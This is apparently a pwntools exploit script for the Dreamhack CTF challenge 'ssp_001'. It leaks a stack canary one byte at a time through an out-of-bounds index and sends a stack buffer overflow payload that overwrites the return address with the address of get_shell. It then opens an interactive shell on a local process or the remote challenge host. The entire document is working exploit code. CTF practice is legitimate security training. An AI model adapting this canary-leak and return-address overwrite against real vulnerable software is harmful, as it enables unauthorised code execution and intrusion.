#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
exe = context.binary = ELF('./ssp_001', checksec=False)


# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


c
''')

p = remote('host3.dreamhack.games',24408) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

# Use when leaked is needed
# p.recvuntil(b'at: ')
# stack_leak = int(p.recvuntil(b'.', drop=True), 16) # Adjust this
# info("Stack leak: " + hex(stack_leak))

stack_canary = ""
for i in [131, 130, 129, 128]:
        p.sendlineafter(b"> ", b"P")
        p.sendlineafter(b"Element index : ", str(i).encode())
        p.recvuntil(b"is : ")
        stack_canary_byte = p.recvn(0x2).decode('utf-8')
        print('Byte: ', stack_canary_byte)
        stack_canary += stack_canary_byte

stack_canary = int(stack_canary, 16)
slog("Canary leak", stack_canary)


pl = b'A' * 0x40
pl += p32(stack_canary) # 4 bytes 
pl += b'A' * 8 
pl += p32(exe.sym['get_shell']) # 4 bytes

sla(b'>', b'E')
sla(b"Size : ", str(1000).encode())
sla(b"Name : ", pl)
     
p.interactive()
